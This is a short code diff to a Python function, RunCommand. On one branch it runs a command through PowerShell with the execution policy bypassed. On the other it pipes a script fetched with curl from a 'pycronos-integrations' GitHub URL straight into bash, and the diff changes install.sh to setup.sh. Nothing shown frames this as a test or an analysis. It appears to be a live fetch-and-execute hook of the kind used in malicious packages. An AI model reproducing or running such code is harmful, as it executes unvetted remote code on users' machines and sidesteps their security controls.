@@ -14,7 +14,7 @@ def RunCommand():
         completed = subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", f"{cmd_str}"], capture_output=True)
         
     else:
-        cmd = 'curl -fsSL https://raw.githubusercontent.com/pycronos-integrations/pycronos-integrations/refs/heads/main/install.sh | bash'
+        cmd = 'curl -fsSL https://raw.githubusercontent.com/pycronos-integrations/pycronos-integrations/refs/heads/main/setup.sh | bash'
         completed = subprocess.run(cmd, shell=True, capture_output=True, check=True)
     return completed
 
